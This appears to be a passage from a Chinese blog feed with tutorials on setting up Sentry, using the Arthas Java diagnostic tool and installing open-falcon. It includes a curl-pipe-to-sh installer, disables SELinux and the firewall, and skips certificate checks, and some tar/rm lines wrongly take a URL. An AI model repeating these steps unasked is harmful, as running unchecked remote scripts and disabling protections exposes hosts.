class="line"></span><br><span class="line"># Buffers (combined with queueing) act as an intermediate layer between the</span><br><span class="line"># database and the storage API. They will greatly improve efficiency on large</span><br><span class="line"># numbers of the same events being sent to the API in a short amount of time.</span><br><span class="line"># (read: if you send any kind of real data to Sentry, you should enable buffers)</span><br><span class="line"></span><br><span class="line">SENTRY_BUFFER = &apos;sentry.buffer.redis.RedisBuffer&apos;</span><br><span class="line"></span><br><span class="line">##########</span><br><span class="line"># Quotas #</span><br><span class="line">##########</span><br><span class="line"></span><br><span class="line"># Quotas allow you to rate limit individual projects or the Sentry install as</span><br><span class="line"># a whole.</span><br><span class="line"></span><br><span class="line">SENTRY_QUOTAS = &apos;sentry.quotas.redis.RedisQuota&apos;</span><br><span class="line"></span><br><span class="line">########</span><br><span class="line"># TSDB #</span><br><span class="line">########</span><br><span class="line"></span><br><span class="line"># The TSDB is used for building charts as well as making things like per-rate</span><br><span class="line"># alerts possible.</span><br><span class="line"></span><br><span class="line">SENTRY_TSDB = &apos;sentry.tsdb.redis.RedisTSDB&apos;</span><br><span class="line"></span><br><span class="line">###########</span><br><span class="line"># Digests #</span><br><span class="line">###########</span><br><span class="line"></span><br><span class="line"># The digest backend powers notification summaries.</span><br><span class="line"></span><br><span class="line">SENTRY_DIGESTS = &apos;sentry.digests.backends.redis.RedisBackend&apos;</span><br><span class="line"></span><br><span class="line">################</span><br><span class="line"># File storage #</span><br><span class="line">################</span><br><span class="line"></span><br><span class="line"># Any Django storage backend is compatible with Sentry. For more solutions see</span><br><span class="line"># the django-storages package: https://django-storages.readthedocs.org/en/latest/</span><br><span class="line"></span><br><span class="line">SENTRY_FILESTORE = &apos;django.core.files.storage.FileSystemStorage&apos;</span><br><span class="line">SENTRY_FILESTORE_OPTIONS = &#123;</span><br><span class="line">    &apos;location&apos;: &apos;/tmp/sentry-files&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">##############</span><br><span class="line"># Web Server #</span><br><span class="line">##############</span><br><span class="line"></span><br><span class="line"># If you&apos;re using a reverse SSL proxy, you should enable the X-Forwarded-Proto</span><br><span class="line"># header and uncomment the following settings</span><br><span class="line"># SECURE_PROXY_SSL_HEADER = (&apos;HTTP_X_FORWARDED_PROTO&apos;, &apos;https&apos;)</span><br><span class="line"># SESSION_COOKIE_SECURE = True</span><br><span class="line"># CSRF_COOKIE_SECURE = True</span><br><span class="line"></span><br><span class="line"># If you&apos;re not hosting at the root of your web server,</span><br><span class="line"># you need to uncomment and set it to the path where Sentry is hosted.</span><br><span class="line"># FORCE_SCRIPT_NAME = &apos;/sentry&apos;</span><br><span class="line"></span><br><span class="line">SENTRY_WEB_HOST = &apos;0.0.0.0&apos;</span><br><span class="line">SENTRY_WEB_PORT = 5000</span><br><span class="line">SENTRY_WEB_OPTIONS = &#123;</span><br><span class="line">    # &apos;workers&apos;: 3,  # the number of web workers</span><br><span class="line">    # &apos;protocol&apos;: &apos;uwsgi&apos;,  # Enable uwsgi protocol instead of http</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LANGUAGES = (</span><br><span class="line">    (&apos;en&apos;, gettext_noop(&apos;English&apos;)),</span><br><span class="line">    (&apos;zh-cn&apos;, gettext_noop(&apos;Simplified Chinese&apos;)),</span><br><span class="line">    # (&apos;zh-cn&apos;, gettext_noop(&apos;Traditional Chinese&apos;)),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="运行-Sentry"><a href="#运行-Sentry" class="headerlink" title="运行 Sentry"></a>运行 Sentry</h3><ol>
<li>初始化:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sentry upgrade</span><br></pre></td></tr></table></figure>

<p>注意，这里可能会出现错误，可以参考下面遇到的坑。初始化的时候，需要设置一个 superuser 角色，直接按提示操作即可。</p>
<ol>
<li>启动 web 进程:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sentry run web</span><br></pre></td></tr></table></figure>

<ol>
<li>启动 worker 进程:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sentry run worker</span><br></pre></td></tr></table></figure>

<ol>
<li>这时候，通过 IP:PORT 的形式访问下，填写刚才填写的用户名和密码即可登录。登录后，我们创建一个 project。我这里设置的是 Odeon_Dev，接下来选择项目，我选择的是 Django。这个时候，会弹出一个在项目中配置的教程。我们按照提示操作即可。</li>
</ol>
<p>测试环境的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost:5000/sentry/odeon_dev/</span><br></pre></td></tr></table></figure>

<h3 id="项目中配置-Sentry"><a href="#项目中配置-Sentry" class="headerlink" title="项目中配置 Sentry"></a>项目中配置 Sentry</h3><p>按照上面的操作，Sentry 服务就可以 run 起来了。接下来需要在 Odeon 的项目中配置下 Sentry 环境即可。这里，我们需要引入一个新包: raven。我安装的 是 raven 6.1.0</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装：</span><br><span class="line">  A. 可以直接下载 raven 包，将其导入到环境中;</span><br><span class="line">  B. 直接指令安装: build/env/bin/pip install raven==6.1.0</span><br><span class="line"></span><br><span class="line">项目配置：</span><br><span class="line">  直接将 sentry 创建 project 时返回的信息放入 settings 文件中即可</span><br><span class="line"></span><br><span class="line">    import os</span><br><span class="line">    import raven</span><br><span class="line"></span><br><span class="line">    RAVEN_CONFIG = &#123;</span><br><span class="line">        &apos;dsn&apos;: &apos;http://fxxx:xxx@localhost:xxx/2&apos;,</span><br><span class="line">        &apos;release&apos;: raven.fetch_git_sha(os.path.dirname(os.pardir)),</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>至此，整个 Sentry 的搭建和项目中需要的配置就完全 OK 了。<br>当然，也可以更完善一下，比如：</p>
<ol>
<li>利用 Nginx 反向代理使用域名访问服务；</li>
<li>利用 supervisor 来起 Sentry 服务等。</li>
</ol>
<p>接下来，就是按需使用了。</p>
<h3 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h3><ol>
<li>sentry默认使用 PostgreSQL。我用的是 mysql。运行 sentry upgrade 的时候，发现运行到 db migration 的时候抛了异常，查阅发现是 db engine 使用的是MyISAM，不支持 transaction 导致的。这里需要注意下，我将 engine 指定为 InnoDB后，执行 migration 的时候错误消失。</li>
<li>页面打开后，提示 worker 没有正常运行。发现没有启动 worker。我们手动启动下 worker，启动时，需要在系统中将 C_FORCE_ROOT 设置为 true。详细点击： <a href="https://stackoverflow.com/questions/20346851/running-celery-as-root" target="_blank" rel="noopener">参考链接</a></li>
</ol>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul>
<li><a href="https://yunsonbai.top/2016/05/30/django-sentry/" target="_blank" rel="noopener">https://yunsonbai.top/2016/05/30/django-sentry/</a></li>
<li><a href="https://tech.liuchao.me/2015/06/monitor-service-error-logs-by-using-sentry/" target="_blank" rel="noopener">https://tech.liuchao.me/2015/06/monitor-service-error-logs-by-using-sentry/</a></li>
</ul>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Sentry</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里Java神级诊断工具arthas</title>
    <url>/articles/9655b613.html</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在阿里巴巴内部，有很多自研工具供开发者使用，其中有一款工具，是几乎每个Java开发都使用过的工具，那就是<strong>Arthas</strong>，这是一款<strong>Java诊断工具</strong>，是一款牛逼<strong>带闪电的工具</strong>。该工具已于2018年9月份开源。</p>
<p><a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">GitHub 地址</a></p>
<p><a href="https://alibaba.github.io/arthas/" target="_blank" rel="noopener">用户文档</a></p>
<p><img src="/articles/9655b613/1.png" alt></p>
<p>在日常开发中，你是否遇到过以下问题：</p>
<blockquote>
<ol>
<li>这个类从哪个 jar 包加载的？为什么会报各种类相关的 Exception？</li>
<li>我改的代码为什么没有执行到？难道是我没 commit？分支搞错了？</li>
<li>遇到问题无法在线上 debug，难道只能通过加日志再重新发布吗？</li>
<li>线上遇到某个用户的数据处理有问题，但线上同样无法 debug，线下无法重现！</li>
<li>是否有一个全局视角来查看系统的运行状况？</li>
<li>有什么办法可以监控到JVM的实时运行状态？</li>
</ol>
</blockquote>
<p>以上问题，通通可以通过Arthas来进行问题诊断！！！是不是很好很强大。</p>
<a id="more"></a>

<h2 id="Arthas-安装"><a href="#Arthas-安装" class="headerlink" title="Arthas 安装"></a>Arthas 安装</h2><h3 id="使用脚本一键安装"><a href="#使用脚本一键安装" class="headerlink" title="使用脚本一键安装"></a>使用脚本一键安装</h3><p>Arthas 支持在 Linux/Unix/Mac 等平台上一键安装，请复制以下内容，并粘贴到命令行中，敲 回车 执行即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L https://alibaba.github.io/arthas/install.sh | sh</span><br></pre></td></tr></table></figure>

<p>上述命令会下载启动脚本文件 as.sh 到当前目录，你可以放在任何地方或将其加入到 $PATH 中。</p>
<p>直接在shell下面执行./as.sh，就会进入交互界面。</p>
<p>也可以执行./as.sh -h来获取更多参数信息。</p>
<p>如果从github下载有问题，可以使用gitee镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -L https://arthas.gitee.io/install.sh | sh</span><br></pre></td></tr></table></figure>

<h3 id="使用arthas-boot-安装-推荐"><a href="#使用arthas-boot-安装-推荐" class="headerlink" title="使用arthas-boot 安装(推荐)"></a>使用arthas-boot 安装(推荐)</h3><p>下载arthas-boot.jar，然后用java -jar的方式启动：</p>
<ol>
<li><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://alibaba.github.io/arthas/arthas-boot.jar</span><br><span class="line">java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure>

<p>打印帮助信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar arthas-boot.jar -h</span><br></pre></td></tr></table></figure>

<p>如果下载速度比较慢，可以使用aliyun的镜像：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar arthas-boot.jar --repo-mirror aliyun --use-http</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>​       如果从github下载有问题，可以使用gitee镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://arthas.gitee.io/arthas-boot.jar</span><br></pre></td></tr></table></figure>

<h2 id="启动Arthas"><a href="#启动Arthas" class="headerlink" title="启动Arthas"></a>启动Arthas</h2><p>在命令行下面执行（使用和目标进程一致的用户启动，否则可能attach失败）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure>

<ul>
<li><p>执行该程序的用户需要和目标进程具有相同的权限。比如以<code>admin</code>用户来执行：<code>sudo su admin &amp;&amp; java -jar arthas-boot.jar</code> 或 <code>sudo -u admin -EH java -jar arthas-boot.jar</code>。</p>
</li>
<li><p>如果attach不上目标进程，可以查看<code>~/logs/arthas/</code> 目录下的日志。</p>
</li>
<li><p>如果下载速度比较慢，可以使用aliyun的镜像：<code>java -jar arthas-boot.jar --repo-mirror aliyun --use-http</code></p>
</li>
<li><p><code>java -jar arthas-boot.jar -h</code> 打印更多参数信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure>

<p><img src="/articles/9655b613/2.png" alt></p>
</li>
</ul>
<p>启动成功会列出java进程，随便选择一个后回车或直接回车。</p>
<h2 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h2><h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><ul>
<li>help——查看命令帮助信息</li>
<li><a href="https://alibaba.github.io/arthas/cat.html" target="_blank" rel="noopener">cat</a>——打印文件内容，和linux里的cat命令类似</li>
<li><a href="https://alibaba.github.io/arthas/pwd.html" target="_blank" rel="noopener">pwd</a>——返回当前的工作目录，和linux命令类似</li>
<li>cls——清空当前屏幕区域</li>
<li>session——查看当前会话的信息</li>
<li><a href="https://alibaba.github.io/arthas/reset.html" target="_blank" rel="noopener">reset</a>——重置增强类，将被 Arthas 增强过的类全部还原，Arthas 服务端关闭时会重置所有增强过的类</li>
<li>version——输出当前目标 Java 进程所加载的 Arthas 版本号</li>
<li>history——打印命令历史</li>
<li>quit——退出当前 Arthas 客户端，其他 Arthas 客户端不受影响</li>
<li>shutdown——关闭 Arthas 服务端，所有 Arthas 客户端全部退出</li>
<li><a href="https://alibaba.github.io/arthas/keymap.html" target="_blank" rel="noopener">keymap</a>——Arthas快捷键列表及自定义快捷键</li>
</ul>
<h3 id="jvm相关"><a href="#jvm相关" class="headerlink" title="jvm相关"></a>jvm相关</h3><ul>
<li><a href="https://alibaba.github.io/arthas/dashboard.html" target="_blank" rel="noopener">dashboard</a>——当前系统的实时数据面板</li>
<li><a href="https://alibaba.github.io/arthas/thread.html" target="_blank" rel="noopener">thread</a>——查看当前 JVM 的线程堆栈信息</li>
<li><a href="https://alibaba.github.io/arthas/jvm.html" target="_blank" rel="noopener">jvm</a>——查看当前 JVM 的信息</li>
<li><a href="https://alibaba.github.io/arthas/sysprop.html" target="_blank" rel="noopener">sysprop</a>——查看和修改JVM的系统属性</li>
<li><a href="https://alibaba.github.io/arthas/sysenv.html" target="_blank" rel="noopener">sysenv</a>——查看JVM的环境变量</li>
<li><a href="https://alibaba.github.io/arthas/getstatic.html" target="_blank" rel="noopener">getstatic</a>——查看类的静态属性</li>
<li><strong>New!</strong> <a href="https://alibaba.github.io/arthas/ognl.html" target="_blank" rel="noopener">ognl</a>——执行ognl表达式</li>
<li><strong>New!</strong> <a href="https://alibaba.github.io/arthas/mbean.html" target="_blank" rel="noopener">mbean</a>——查看 Mbean 的信息</li>
</ul>
<h3 id="class-classloader相关"><a href="#class-classloader相关" class="headerlink" title="class/classloader相关"></a>class/classloader相关</h3><ul>
<li><a href="https://alibaba.github.io/arthas/sc.html" target="_blank" rel="noopener">sc</a>——查看JVM已加载的类信息</li>
<li><a href="https://alibaba.github.io/arthas/sm.html" target="_blank" rel="noopener">sm</a>——查看已加载类的方法信息</li>
<li><a href="https://alibaba.github.io/arthas/jad.html" target="_blank" rel="noopener">jad</a>——反编译指定已加载类的源码</li>
<li><a href="https://alibaba.github.io/arthas/mc.html" target="_blank" rel="noopener">mc</a>——内存编绎器，内存编绎<code>.java</code>文件为<code>.class</code>文件</li>
<li><a href="https://alibaba.github.io/arthas/redefine.html" target="_blank" rel="noopener">redefine</a>——加载外部的<code>.class</code>文件，redefine到JVM里</li>
<li><a href="https://alibaba.github.io/arthas/dump.html" target="_blank" rel="noopener">dump</a>——dump 已加载类的 byte code 到特定目录</li>
<li><a href="https://alibaba.github.io/arthas/classloader.html" target="_blank" rel="noopener">classloader</a>——查看classloader的继承树，urls，类加载信息，使用classloader去getResource</li>
</ul>
<h3 id="monitor-watch-trace相关"><a href="#monitor-watch-trace相关" class="headerlink" title="monitor/watch/trace相关"></a>monitor/watch/trace相关</h3><blockquote>
<p>请注意，这些命令，都通过字节码增强技术来实现的，会在指定类的方法中插入一些切面来实现数据统计和观测，因此在线上、预发使用时，请尽量明确需要观测的类、方法以及条件，诊断结束要执行 <code>shutdown</code> 或将增强过的类执行 <code>reset</code> 命令。</p>
</blockquote>
<ul>
<li><a href="https://alibaba.github.io/arthas/monitor.html" target="_blank" rel="noopener">monitor</a>——方法执行监控</li>
<li><a href="https://alibaba.github.io/arthas/watch.html" target="_blank" rel="noopener">watch</a>——方法执行数据观测</li>
<li><a href="https://alibaba.github.io/arthas/trace.html" target="_blank" rel="noopener">trace</a>——方法内部调用路径，并输出方法路径上的每个节点上耗时</li>
<li><a href="https://alibaba.github.io/arthas/stack.html" target="_blank" rel="noopener">stack</a>——输出当前方法被调用的调用路径</li>
<li><a href="https://alibaba.github.io/arthas/tt.html" target="_blank" rel="noopener">tt</a>——方法执行数据的时空隧道，记录下指定方法每次调用的入参和返回信息，并能对这些不同的时间下调用进行观测</li>
</ul>
<h3 id="options"><a href="#options" class="headerlink" title="options"></a>options</h3><ul>
<li><a href="https://alibaba.github.io/arthas/options.html" target="_blank" rel="noopener">options</a>——查看或设置Arthas全局开关</li>
</ul>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>Arthas支持使用管道对上述命令的结果进行进一步的处理，如<code>sm java.lang.String * | grep &#39;index&#39;</code></p>
<h3 id="后台异步任务"><a href="#后台异步任务" class="headerlink" title="后台异步任务"></a>后台异步任务</h3><p>当线上出现偶发的问题，比如需要watch某个条件，而这个条件一天可能才会出现一次时，异步后台任务就派上用场了，详情请参考<a href="https://alibaba.github.io/arthas/async.html" target="_blank" rel="noopener">这里</a></p>
<ul>
<li>使用 &gt; 将结果重写向到日志文件，使用 &amp; 指定命令是后台运行，session断开不影响任务执行（生命周期默认为1天）</li>
<li>jobs——列出所有job</li>
<li>kill——强制终止任务</li>
<li>fg——将暂停的任务拉到前台执行</li>
<li>bg——将暂停的任务放到后台执行</li>
</ul>
<h3 id="Web-Console"><a href="#Web-Console" class="headerlink" title="Web Console"></a>Web Console</h3><p>通过websocket连接Arthas。</p>
<ul>
<li><a href="https://alibaba.github.io/arthas/web-console.html" target="_blank" rel="noopener">Web Console</a></li>
</ul>
<h2 id="主要命令详解"><a href="#主要命令详解" class="headerlink" title="主要命令详解"></a>主要命令详解</h2><h3 id="Dashboard"><a href="#Dashboard" class="headerlink" title="Dashboard"></a>Dashboard</h3><p>当前系统的实时数据面板，按 ctrl+c 退出。</p>
<p>当运行在Ali-tomcat时，会显示当前tomcat的实时信息，如HTTP请求的qps, rt, 错误数, 线程池信息等等</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dashboard</span><br></pre></td></tr></table></figure>

<p><img src="/articles/9655b613/3.png" alt></p>
<p>数据说明</p>
<ul>
<li>ID: Java级别的线程ID，注意这个ID不能跟jstack中的nativeID一一对应</li>
<li>NAME: 线程名</li>
<li>GROUP: 线程组名</li>
<li>PRIORITY: 线程优先级, 1~10之间的数字，越大表示优先级越高</li>
<li>STATE: 线程的状态</li>
<li>CPU%: 线程消耗的cpu占比，采样100ms，将所有线程在这100ms内的cpu使用量求和，再算出每个线程的cpu使用占比。</li>
<li>TIME: 线程运行总时间，数据格式为<code>分：秒</code></li>
<li>INTERRUPTED: 线程当前的中断位状态</li>
<li>DAEMON: 是否是daemon线程</li>
</ul>
<h3 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h3><p>查看当前线程信息，查看线程的堆栈</p>
<p>参数说明</p>
<table>
<thead>
<tr>
<th>参数名称</th>
<th>参数说明</th>
</tr>
</thead>
<tbody><tr>
<td><em>id</em></td>
<td>线程id</td>
</tr>
<tr>
<td>[n:]</td>
<td>指定最忙的前N个线程并打印堆栈</td>
</tr>
<tr>
<td>[b]</td>
<td>找出当前阻塞其他线程的线程</td>
</tr>
<tr>
<td>[i <code>&lt;value&gt;</code>]</td>
<td>指定cpu占比统计的采样间隔，单位为毫秒</td>
</tr>
</tbody></table>
<blockquote>
<p>cpu占比是如何统计出来的？</p>
</blockquote>
<blockquote>
<p>这里的cpu统计的是，一段采样间隔内，当前JVM里各个线程所占用的cpu时间占总cpu时间的百分比。其计算方法为： 首先进行一次采样，获得所有线程的cpu的使用时间(调用的是<code>java.lang.management.ThreadMXBean#getThreadCpuTime</code>这个接口)，然后睡眠一段时间，默认100ms，可以通过<code>-i</code>参数指定，然后再采样一次，最后得出这段时间内各个线程消耗的cpu时间情况，最后算出百分比。</p>
</blockquote>
<blockquote>
<p>注意： 这个统计也会产生一定的开销（JDK这个接口本身开销比较大），因此会看到as的线程占用一定的百分比，为了降低统计自身的开销带来的影响，可以把采样间隔拉长一些，比如5000毫秒。</p>
</blockquote>
<blockquote>
<p>如果想看从Java进程启动开始到现在的cpu占比情况：可以使用<a href="https://github.com/oldratlee/useful-scripts/blob/master/docs/java.md#-show-busy-java-threads" target="_blank" rel="noopener">show-busy-java-threads</a>这个脚本</p>
</blockquote>
<h3 id="jvm"><a href="#jvm" class="headerlink" title="jvm"></a>jvm</h3><p>查看当前JVM信息</p>
<p>这里列举三个命令不再赘述，如你需要深入了解和使用，请详读介绍中的<a href="https://alibaba.github.io/arthas/" target="_blank" rel="noopener">用户文档</a>。</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式开源监控系统open-falcon安装使用笔记</title>
    <url>/articles/4354c695.html</url>
    <content><![CDATA[<h2 id="官方介绍"><a href="#官方介绍" class="headerlink" title="官方介绍"></a>官方介绍</h2><p>监控系统是整个运维环节，乃至整个产品生命周期中最重要的一环，事前及时预警发现故障，事后提供翔实的数据用于追查定位问题。监控系统作为一个成熟的运维产品，业界有很多开源的实现可供选择。当公司刚刚起步，业务规模较小，运维团队也刚刚建立的初期，选择一款开源的监控系统，是一个省时省力，效率最高的方案。之后，随着业务规模的持续快速增长，监控的对象也越来越多，越来越复杂，监控系统的使用对象也从最初少数的几个SRE，扩大为更多的DEVS，SRE。这时候，监控系统的容量和用户的“使用效率”成了最为突出的问题。</p>
<p>​        监控系统业界有很多杰出的开源监控系统。我们在早期，一直在用zabbix，不过随着业务的快速发展，以及互联网公司特有的一些需求，现有的开源的监控系统在性能、扩展性、和用户的使用效率方面，已经无法支撑了。</p>
<p>​        因此，我们在过去的一年里，从互联网公司的一些需求出发，从各位SRE、SA、DEVS的使用经验和反馈出发，结合业界的一些大的互联网公司做监控，用监控的一些思考出发，设计开发了小米的监控系统：Open-Falcon。</p>
<a id="more"></a>

<h2 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h2><ul>
<li><p><strong>数据采集免配置</strong>：agent自发现、支持Plugin、主动推送模式</p>
</li>
<li><p><strong>容量水平扩展</strong>：生产环境每秒50万次数据收集、告警、存储、绘图，可持续水平扩展。</p>
</li>
<li><p><strong>告警策略自发现</strong>：Web界面、支持策略模板、模板继承和覆盖、多种告警方式、支持回调动作。</p>
</li>
<li><p><strong>告警设置人性化</strong>：支持最大告警次数、告警级别设置、告警恢复通知、告警暂停、不同时段不同阈值、支持维护周期，支持告警合并。</p>
</li>
<li><p><strong>历史数据高效查询</strong>：秒级返回上百个指标一年的历史数据。</p>
</li>
<li><p><strong>Dashboard人性化</strong>：多维度的数据展示，用户自定义Dashboard等功能。</p>
</li>
<li><p><strong>架构设计高可用</strong>：整个系统无核心单点，易运维，易部署</p>
</li>
</ul>
<h2 id="架构图："><a href="#架构图：" class="headerlink" title="架构图："></a><strong>架构图：</strong></h2><p>官网架构图</p>
<p><img src="/articles/4354c695/1.png" alt></p>
<p>其中虚线所在的aggregator组件还在设计开发阶段。</p>
<p>网友画的</p>
<p><img src="/articles/4354c695/2.png" alt></p>
<h2 id="监控指标"><a href="#监控指标" class="headerlink" title="监控指标"></a>监控指标</h2><p>每台服务器，都有安装falcon-agent，falcon-agent是一个golang开发的daemon程序，用于自发现的采集单机的各种数据和指标，这些指标包括不限于以下几个方面，共计200多项指标。</p>
<ul>
<li>CPU相关</li>
<li>磁盘相关</li>
<li>IO</li>
<li>Load</li>
<li>内存相关</li>
<li>网络相关</li>
<li>端口存活、进程存活</li>
<li>ntp offset（插件）</li>
<li>某个进程资源消耗（插件）</li>
<li>netstat、ss 等相关统计项采集</li>
<li>机器内核配置参数</li>
</ul>
<p>只要安装了falcon-agent的机器，就会自动开始采集各项指标，主动上报，不需要用户在server做任何配置（这和zabbix有很大的不同），这样做的好处，就是用户维护方便，覆盖率高。当然这样做也会server端造成较大的压力，不过open-falcon的服务端组件单机性能足够高，同时都可以水平扩展，所以自动多采集足够多的数据，反而是一件好事情，对于SRE和DEV来讲，事后追查问题，不再是难题。</p>
<p>另外，falcon-agent提供了一个proxy-gateway，用户可以方便的通过http接口，push数据到本机的gateway，gateway会帮忙高效率的转发到server端。</p>
<p>falcon-agent，可以在我们的github上找到 : <a href="https://github.com/open-falcon/agent" target="_blank" rel="noopener">https://github.com/open-falcon/agent</a></p>
<h2 id="数据流程图："><a href="#数据流程图：" class="headerlink" title="数据流程图："></a><strong>数据流程图：</strong></h2><p><img src="/articles/4354c695/3.jpg" alt></p>
<h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><h3 id="系统环境：centos7-6"><a href="#系统环境：centos7-6" class="headerlink" title="系统环境：centos7.6"></a>系统环境：centos7.6</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#源更新</span><br><span class="line">yum -y update</span><br><span class="line">#安装常用系统工具</span><br><span class="line">yum -y install wget telnet git net-tools deltarpm epel-release</span><br><span class="line">#关闭防火墙</span><br><span class="line">sed -i &quot;s/SELINUX=enforcing/SELINUX=disabled/g&quot; /etc/selinux/config</span><br><span class="line">setenforce 0</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br></pre></td></tr></table></figure>

<h3 id="安装一些系统常用软件"><a href="#安装一些系统常用软件" class="headerlink" title="安装一些系统常用软件"></a>安装一些系统常用软件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install gcc gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel zip unzip ncurses ncurses-devel curl curl-devel e2fsprogs e2fsprogs-devel krb5-devel libidn libidn-devel openssl openssh openssl-devel libxslt-devel libevent-devel ntp  libtool-ltdl bison libtool vim-enhanced python wget lsof iptraf strace lrzsz kernel-devel kernel-headers pam-devel Tcl/Tk  cmake  ncurses-devel bison setuptool popt-devel net-snmp screen perl-devel pcre-devel net-snmp screen tcpdump rsync sysstat man iptables sudo idconfig git system-config-network-tui bind-utils update arpscan tmux elinks numactl iftop  bwm-ng</span><br></pre></td></tr></table></figure>

<h3 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py --no-check-certificate</span><br><span class="line"></span><br><span class="line">python get-pip.py</span><br><span class="line"></span><br><span class="line">#使用国内豆瓣源</span><br><span class="line"></span><br><span class="line">mkdir /root/.pip</span><br><span class="line"></span><br><span class="line">vi /root/.pip/pip.conf</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = [http://pypi.douban.com/simple](http://pypi.douban.com/simple)</span><br><span class="line">trusted-host = pypi.douban.com</span><br></pre></td></tr></table></figure>

<h3 id="安装数据库"><a href="#安装数据库" class="headerlink" title="安装数据库"></a>安装数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm</span><br><span class="line">rpm -ivh mysql-community-release-el7-5.noarch.rpm</span><br><span class="line">yum install mysql-community-server</span><br><span class="line">systemctl start mysql</span><br><span class="line">systemctl enable mysqld</span><br></pre></td></tr></table></figure>

<h3 id="安装redis"><a href="#安装redis" class="headerlink" title="安装redis"></a>安装redis</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install redis</span><br><span class="line">systemctl start redis</span><br><span class="line">systemctl enable redis</span><br></pre></td></tr></table></figure>

<h3 id="安装go环境（若使用编译好的二进制文件，此步骤可忽略）"><a href="#安装go环境（若使用编译好的二进制文件，此步骤可忽略）" class="headerlink" title="安装go环境（若使用编译好的二进制文件，此步骤可忽略）"></a>安装go环境<strong>（若使用编译好的二进制文件，此步骤可忽略）</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install golang</span><br><span class="line">go version</span><br><span class="line">go version go1.6.3 linux/amd64</span><br></pre></td></tr></table></figure>

<h3 id="初始化数据库"><a href="#初始化数据库" class="headerlink" title="初始化数据库"></a>初始化数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir /opt/openfalcon</span><br><span class="line">cd /opt/openfalcon</span><br><span class="line">git clone https://github.com/open-falcon/scripts.git</span><br><span class="line">#导入表结构</span><br><span class="line">cd scripts</span><br><span class="line">mysql -h localhost -u root --password=&quot;&quot; &lt; db_schema/graph-db-schema.sql</span><br><span class="line">mysql -h localhost -u root --password=&quot;&quot; &lt; db_schema/dashboard-db-schema.sql</span><br><span class="line">mysql -h localhost -u root --password=&quot;&quot; &lt; db_schema/portal-db-schema.sql</span><br><span class="line">mysql -h localhost -u root --password=&quot;&quot; &lt; db_schema/links-db-schema.sql</span><br><span class="line">mysql -h localhost -u root --password=&quot;&quot; &lt; db_schema/uic-db-schema.sql</span><br></pre></td></tr></table></figure>

<h3 id="下载编译好的组件"><a href="#下载编译好的组件" class="headerlink" title="下载编译好的组件"></a>下载编译好的组件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir /opt/openfalcon/tmp</span><br><span class="line">cd /opt/openfalcon/tmp</span><br><span class="line"></span><br><span class="line">wget https://github.com/open-falcon/of-release/releases/download/v0.1.0/open-falcon-v0.1.0.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxf https://github.com/open-falcon/of-release/releases/download/v0.1.0/open-falcon-v0.1.0.tar.gz</span><br><span class="line"></span><br><span class="line">rm -rf https://github.com/open-falcon/of-release/releases/download/v0.1.0/open-falcon-v0.1.0.tar.gz</span><br><span class="line"></span><br><span class="line">cd /opt/openfalcon</span><br><span class="line"></span><br><span class="line">for x in `find ./tmp/ -name 